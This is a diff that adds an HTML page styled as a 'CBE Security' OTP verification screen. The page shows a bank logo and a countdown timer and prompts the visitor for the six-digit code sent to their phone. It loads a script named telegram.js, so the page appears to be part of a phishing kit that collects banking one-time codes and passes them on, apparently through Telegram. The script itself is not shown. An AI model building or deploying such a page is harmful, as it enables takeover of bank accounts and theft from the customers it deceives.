@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification - CBE Security</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/cbe-theme.css">
+    <link rel="stylesheet" href="css/animations.css">
+</head>
+<body>
+    <div class="container">
+        <div class="cbe-header">
+            <img src="assets/images/cbe-logo.png" alt="CBE Logo" class="cbe-logo">
+            <h1>OTP Verification</h1>
+        </div>
+
+        <div class="form-container">
+            <div class="otp-icon">🔐</div>
+            <h2>Enter OTP Code</h2>
+            <p class="description">We've sent a verification code to your registered mobile number</p>
+            
+            <div class="otp-timer">
+                <span id="timerDisplay">05:00</span>
+                <span class="resend-link" onclick="resendOTP()">Resend OTP</span>
+            </div>
+
+            <form id="otpForm">
+                <div class="form-group">
+                    <label for="otp">OTP Code</label>
+                    <input type="text" id="otp" name="otp" 
+                           placeholder="Enter 6-digit OTP" required
+                           pattern="[0-9]{6}" maxlength="6">
+                </div>
+
+                <button type="submit" class="cbe-btn">Verify OTP</button>
+            </form>
+
+            <div class="security-info">
+                <p>🔐 This OTP expires in 5 minutes</p>
+                <p>⚠️ Never share your OTP with anyone</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/main.js"></script>
+    <script src="js/validation.js"></script>
+    <script src="js/telegram.js"></script>
+</body>
+</html>
